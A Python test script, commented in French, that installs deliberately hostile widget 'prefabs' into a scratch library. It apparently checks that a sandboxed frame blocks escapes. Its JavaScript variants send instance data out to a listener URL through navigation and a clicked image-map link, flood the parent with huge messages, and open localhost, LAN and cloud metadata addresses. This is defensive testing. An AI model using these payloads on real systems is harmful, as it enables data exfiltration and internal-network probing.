"""S3 rework — prefabs hostiles (qui passent le lint) publiés dans une bibliothèque de scratch.

Usage (racine du dépôt) : python <ce fichier> <JARVIS_DATA_ROOT de scratch> <url de l'écouteur>
Chaque comportement tente de sortir du cadre ; `test.counter` est le témoin
sain (aucun faux positif du contrôle de navigation). Toute réception
d'`init` est tracée par `console.log('INIT-RECEIVED <id>')` dans le cadre.
"""

import copy
import json
from pathlib import Path
import sys

sys.path.insert(0, str(Path.cwd()))
from jarvis.domain.prefab import parse_candidate  # noqa: E402
from tests.fakes.prefabs import install_version  # noqa: E402

FIX = Path("tests/fixtures/prefabs/test.netprobe/1")
root = Path(sys.argv[1]) / "prefabs"
X = sys.argv[2].rstrip("/")
root.mkdir(parents=True, exist_ok=True)
base = {"manifest": json.loads((FIX / "manifest.json").read_text("utf-8")),
        "template": (FIX / "template.html").read_text("utf-8"),
        "style": (FIX / "style.css").read_text("utf-8"),
        "behavior": (FIX / "behavior.js").read_text("utf-8")}
TRACE = "console.log('INIT-RECEIVED ' + c.instance.object_id);"
variants = {
    "test.netprobe": {},
    # F1 : navigation du cadre lui-même, données de l'instance dans l'URL.
    "qa.navexfil": {"behavior": "jarvis.on('init', function (c) { " + TRACE + " location.href = '" + X
                    + "/exfil?d=' + encodeURIComponent(JSON.stringify(c.data)); });"},
    # F1 : lien d'image construit par le comportement (le lint du gabarit ne le voit pas).
    "qa.domarea": {"behavior": "jarvis.on('init', function (c) { " + TRACE
                   + " var m = document.createElement('map'); m.name = 'm';"
                   " var a = document.createElement('area'); a.shape = 'rect'; a.coords = '0,0,50,20';"
                   " a.href = '" + X + "/area-click?d=' + encodeURIComponent(JSON.stringify(c.data));"
                   " m.appendChild(a); document.body.appendChild(m); setTimeout(function () { a.click(); }, 150); });"},
    # F1c : second `ready` après `init`.
    "qa.reready": {"behavior": "jarvis.on('init', function (c) { " + TRACE
                   + " parent.postMessage({jv: 1, type: 'ready'}, '*'); });"},
    # F2 : 64 MiB dans un événement et une erreur, puis 2000 resize.
    "qa.bigmsg": {"behavior": "jarvis.on('init', function (c) { " + TRACE
                  + " var s = 'a'.repeat(64 * 1024 * 1024);"
                  " parent.postMessage({jv: 1, type: 'event', name: 'probed', payload: {s: s}}, '*');"
                  " parent.postMessage({jv: 1, type: 'error', message: s}, '*');"
                  " for (var i = 0; i < 2000; i++) parent.postMessage({jv: 1, type: 'resize', height: i % 500 + 30}, '*'); });"},
    # F5 : ouvrir le Control Center, Core, le réseau local ; une adresse publique passe.
    "qa.openlocal": {"behavior": "jarvis.on('init', function (c) { " + TRACE
                     + " ['http://127.0.0.1:18974/', 'http://localhost:18973/v1/scene', 'http://192.168.1.1/',"
                     " 'http://169.254.169.254/latest/meta-data', 'http://[::1]:18974/', 'https://example.com/ok']"
                     ".forEach(function (u) { jarvis.openUrl(u); }); });"},
}
for prefab_id, change in variants.items():
    raw = copy.deepcopy(base)
    raw.update(change)
    raw["manifest"]["id"] = prefab_id
    parse_candidate(raw)  # passe le lint S02 (lèverait sinon)
    if (root / prefab_id / "1").exists():
        print("exists", prefab_id)
        continue
    install_version(root, prefab_id, 1, source=raw)
    print("installed", prefab_id)
# Le témoin sain vient des fixtures publiées.
if not (root / "test.counter" / "1").exists():
    from tests.fakes.prefabs import candidate
    install_version(root, "test.counter", 1, source=candidate("test.counter"))
    print("installed test.counter")
